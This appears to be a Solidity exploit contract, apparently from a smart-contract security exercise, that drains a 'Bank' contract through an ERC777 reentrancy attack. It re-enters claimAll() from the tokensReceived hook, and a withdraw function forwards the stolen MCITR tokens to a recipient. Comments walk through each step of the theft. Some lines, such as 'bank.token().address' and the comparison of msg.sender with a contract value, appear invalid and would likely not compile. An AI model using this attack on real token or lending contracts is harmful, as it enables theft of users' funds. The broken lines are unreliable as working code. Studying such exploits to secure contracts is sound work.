pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
    // This is the location of the EIP1820 registry
    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    // When someone tries to send an ERC777 contract, they check if the recipient implements this interface
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    
    // Controls the recursion depth. Max depth is set to 2 to prevent hitting gas limits/stack depth limits too quickly.
    uint8 depth = 0;
    uint8 max_depth = 2;

    Bank public bank; 

    event Deposit(uint256 amount );
    event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);
        // Register with the EIP1820 Registry to be able to receive ERC777 tokens
        _erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this));
    }

    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
        bank = Bank(bank_address);
        _grantRole(ATTACKER_ROLE, address(this));
        _grantRole(ATTACKER_ROLE, bank.token().address );
    }

    /*
       The main attack function that should start the reentrancy attack
       amt is the amt of ETH the attacker will deposit initially to start the attack
    */
    function attack(uint256 amt) payable public {
        require( address(bank) != address(0), "Target bank not set" );
        
        // 1. Initial Deposit: This gives the attacker a positive balance in the Bank contract.
        // This is the trigger that makes claimAll() callable.
        bank.deposit{value: amt}();
        
        // 2. Initial Withdrawal: This call is the start of the vulnerable process.
        // It triggers the claimAll() function, which then calls the token.mint(),
        // which calls this Attacker contract's tokensReceived function.
        bank.claimAll();
        
        // At this point, the initial call stack finishes, and the transaction succeeds, 
        // leaving the Attacker with the initial deposit + stolen tokens.
    }

    /*
       After the attack, this contract has a lot of (stolen) MCITR tokens
       This function sends those tokens to the target recipient
    */
    function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
        ERC777 token = bank.token();
        token.send(recipient,token.balanceOf(address(this)),"");
    }

    /*
       This is the function that gets called when the Bank contract sends MCITR tokens (the hook)
       This is where the reentrancy occurs by recursively calling the vulnerable function.
    */
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        // Only recurse if the call came from the target Bank contract (via its token)
        // and if the recursion depth limit has not been reached.
        
        if (msg.sender == bank.token() && depth < max_depth) {
            depth++;
            emit Recurse(depth);
            
            // Re-enter the vulnerable function.
            // Since balances[msg.sender] (Attacker) has NOT been set to zero yet, 
            // the contract claims the full initial amount again.
            bank.claimAll();
            
            depth--;
        }
    }
}
